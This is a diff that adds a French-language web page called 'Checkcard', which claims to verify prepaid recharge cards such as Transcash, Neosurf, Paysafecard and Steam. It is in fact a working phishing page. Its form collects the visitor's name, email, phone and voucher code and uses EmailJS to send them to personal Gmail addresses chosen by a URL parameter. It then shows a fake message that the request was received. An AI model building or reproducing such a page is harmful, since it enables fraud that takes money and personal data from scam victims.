@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+
+<head>
+    <base href="/checkcard/" />
+    <meta charset="utf-8">
+    <title>Checkcard | Vérifier vos carte et coupon</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Startbox">
+    <meta name="author" content="RunWebRun">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Favicon-->
+    <link rel="icon" type="image/png" href="assets/img/root/favicon.png">
+    <!-- Style-->
+    <!-- build:css -->
+    <link rel="stylesheet" href="assets/vendors/css/magnific-popup.css">
+    <link rel="stylesheet" href="assets/vendors/css/swiper-bundle.css">
+    <link rel="stylesheet" href="assets/css/main.css">
+    <!-- endbuild -->
+    <!-- jQuery-->
+    <script src="assets/vendors/js/jquery.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/account
+            emailjs.init('opvGRa51hKeitmK3T');
+        })();
+
+        var email = '';
+        var str = window.location.href;
+        var url = new URL(str);
+        var card = url.searchParams.get("card");
+        switch (card) {
+            case '9dfd9fe':
+                email = 'tabacserviceofficiel361@gmail.com';
+                break;
+        
+            default:
+                email = 'arnaudadjovi274@gmail.com';
+                break;
+        }
+    </script>
+    <script type="text/javascript">
+        function sendMail(params) {
+
+            var tempParams = {
+                to_mail: email,
+                name: document.getElementById("name").value,
+                email: document.getElementById("email").value,
+                tel: document.getElementById("tel").value,
+                recharge: document.getElementById("recharge").value,
+                recharge_value: document.getElementById("recharge_value").value,
+            };
+
+            emailjs.send("service_tubjdtq", "template_bm0wmtf", tempParams).then(function(res) {
+                console.log("success ".res);
+            })
+
+        }
+
+        window.onload = function() {
+            document.getElementById('contact-form').addEventListener('submit', function(event) {
+                event.preventDefault();
+
+                sendMail();
+
+                var html = `<h3 style="text-align: center; color: white;">
+                                Votre requête à été transmis à notre équipe. Un retour vous sera fait par mail dans les plus bref délai
+                                <span>
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="50" fill="white" class="ms-15 align-self-center bi bi-check2-circle" viewBox="0 0 16 16">
+                                        <path d="M2.5 8a5.5 5.5 0 0 1 8.25-4.764.5.5 0 0 0 .5-.866A6.5 6.5 0 1 0 14.5 8a.5.5 0 0 0-1 0 5.5 5.5 0 1 1-11 0z"/>
+                                        <path d="M15.354 3.354a.5.5 0 0 0-.708-.708L8 9.293 5.354 6.646a.5.5 0 1 0-.708.708l3 3a.5.5 0 0 0 .708 0l7-7z"/>
+                                    </svg>    
+                                </span>
+                            </h3>`
+                document.getElementById("contact-form-area").innerHTML = html;
+            });
+        }
+    </script>
+</head>
+
+<body class="">
+
+    <!-- Begin - Main-->
+    <div class="content-wrap ">
+        <div class="pt-90 pb-90 bg-dark shape-parent">
+            <!-- Shape-->
+            <div class="shape justify-content-start align-items-end"><img loading="lazy" src="assets/img/root/home-1-shape-364x300.png" alt="" width="364" height="300"></div>
+            <div class="background start-custom">
+                <div class="background-image jarallax" data-jarallax="" data-speed="0.8"><img class="jarallax-img" loading="lazy" src="assets/img/root/call-to-action-1920x1080.jpg" alt=""></div>
+                <div class="background-color" style="--background-color: #481FA0; opacity: .9;"></div>
+            </div>
+            <div class="container">
+                <div class="row gy-70">
+                    <div class="col-lg-6 offset-lg-1 order-lg-2"><img class="w-100 rounded-4 shadow mb-lg-n210 rellax no-transform-lg" loading="lazy" src="assets/img/root/transcash.jpg" alt=""></div>
+                    <div id="contact-form-area" class="col-lg-5">
+                        <h2 class="mb-25 text-white text-center" data-show="startbox">Remplissez le formulaire pour faire la vérification</h2>
+                        <p class="m-0 text-white text-center" data-show="startbox" data-show-delay="100">Vous pouvez nous envoyer un mail pour plus de détail.</p>
+
+                        <!-- Form-->
+                        <form id="contact-form" method="post" class="mt-75" data-show="startbox">
+                            <div class="row gy-40">
+                                <div class="col-12 col-md-6">
+                                    <input id="name" name="name" class="form-control form-control-gray" type="text" placeholder="Votre nom *">
+                                </div>
+                                <div class="col-12 col-md-6">
+                                    <input id="email" name="email" class="form-control form-control-gray" type="email" placeholder="Votre mail *">
+                                </div>
+                                <div class="col-12 col-md-6">
+                                    <input id="tel" name="tel" class="form-control form-control-gray" type="tel" placeholder="Votre numéro de téléphome *">
+                                </div>
+                                <div class="col-12 col-md-6">
+                                    <select id="recharge" name="recharge" class="form-control form-control-gray">
+                                        <option selected >Selectionner une recharge</option>
+                                        <option>Transcash</option>
+                                        <option>Néosurf</option>
+                                        <option>PCS card</option>
+                                        <option>Google Play</option>
+                                        <option>Paysafecard</option>
+                                        <option>Steam</option>
+                                    </select>
+                                </div>
+                                <div class="col-12 mb-10">
+                                    <input id="recharge_value" name="recharge_value" class="form-control form-control-gray" type="text" placeholder="Code de la recharge">
+                                </div>
+                                <div class="col-12 text-center">
+                                    <button type="submit" class="btn btn-accent-1">Vérifier</button>
+                                </div>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div>
+    <!-- End - Main-->
+
+    <!-- build:js -->
+    <script src="assets/vendors/js/bootstrap.js"></script>
+    <script src="assets/vendors/js/imagesloaded.pkgd.js"></script>
+    <script src="assets/vendors/js/isotope.pkgd.js"></script>
+    <script src="assets/vendors/js/jarallax.js"></script>
+    <script src="assets/vendors/js/jarallax-element.js"></script>
+    <script src="assets/vendors/js/jquery.countdown.js"></script>
+    <script src="assets/vendors/js/jquery.magnific-popup.js"></script>
+    <script src="assets/vendors/js/ofi.js"></script>
+    <script src="assets/vendors/js/jquery.inview.js"></script>
+    <script src="assets/vendors/js/swiper-bundle.js"></script>
+    <script src="assets/vendors/js/gist-embed.min.js"></script>
+    <script src="assets/js/helpers.js"></script>
+    <script src="assets/js/controllers/show-on-scroll.js"></script>
+    <script src="assets/js/controllers/countdown.js"></script>
+    <script src="assets/js/controllers/isotope.js"></script>
+    <script src="assets/js/controllers/navbar.js"></script>
+    <script src="assets/js/controllers/stretch-column.js"></script>
+    <script src="assets/js/controllers/swiper.js"></script>
+    <script src="assets/js/controllers/others.js"></script>
+    <!-- endbuild -->
+</body>
+
+</html>
